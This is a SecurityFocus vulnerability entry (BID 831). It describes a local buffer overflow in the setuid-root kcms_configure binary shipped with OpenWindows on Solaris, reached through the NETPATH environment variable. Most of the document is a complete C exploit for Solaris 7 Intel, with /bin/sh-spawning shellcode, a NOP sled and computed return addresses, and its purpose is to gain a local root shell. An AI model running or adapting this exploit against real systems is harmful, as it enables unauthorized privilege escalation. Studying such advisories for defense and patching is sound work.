source: http://www.securityfocus.com/bid/831/info

The binary kcms_configure, part of the Kodak Color Management System package shipped with OpenWindows (and ultimately, Solaris) is vulnerable to a local buffer overflow. The buffer which the contents of the environment variable NETPATH are copied into has a predetermined length, which if exceeded can corrupt the stack and cause aribtrary code hidden inside of the oversized buffer to be executed. kcms_configure is installed setuid root and exploitation will result in a local root compromise. 

------ ex_kcms_configure86.c
/*=============================================================================
kcms_configure Exploit for Solaris7 Intel Edition
The Shadow Penguin Security (http://shadowpenguin.backsection.net)
Written by UNYUN (shadowpenguin@backsection.net)
=============================================================================
*/

#define ENV "NETPATH="
#define MAXBUF 3000
#define RETADR 2088
#define RETOFS 0xad0
#define FAKEADR 2076
#define NOP 0x90

unsigned long get_sp(void)
{
__asm__(" movl %esp,%eax ");
}

char exploit_code[] =
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x8d\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x17\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"
"\x55\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3\x33"
"\xc0\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88"
"\x7e\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f"
"\xc3\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\x50\x8d\x46"
"\x08\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff\x83\xc4\x0c\x6a\x01"
"\xe8\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4\xff\xff\xff/bin/sh";

main()
{
char buf[MAXBUF];
unsigned int i,ip,sp;

putenv("LANG=");
sp=get_sp();
printf("ESP=0x%x\n",sp);

memset(buf,NOP,MAXBUF);

ip=sp;
buf[FAKEADR ]=ip&0xff;
buf[FAKEADR+1]=(ip>>8)&0xff;
buf[FAKEADR+2]=(ip>>16)&0xff;
buf[FAKEADR+3]=(ip>>24)&0xff;

ip=sp-RETOFS;
buf[RETADR ]=ip&0xff;
buf[RETADR+1]=(ip>>8)&0xff;
buf[RETADR+2]=(ip>>16)&0xff;
buf[RETADR+3]=(ip>>24)&0xff;

strncpy(buf+2500,exploit_code,strlen(exploit_code));

strncpy(buf,ENV,strlen(ENV));
buf[MAXBUF-1]=0;
putenv(buf);

execl("/usr/openwin/bin/kcms_configure","kcms_configure","1",0);
} 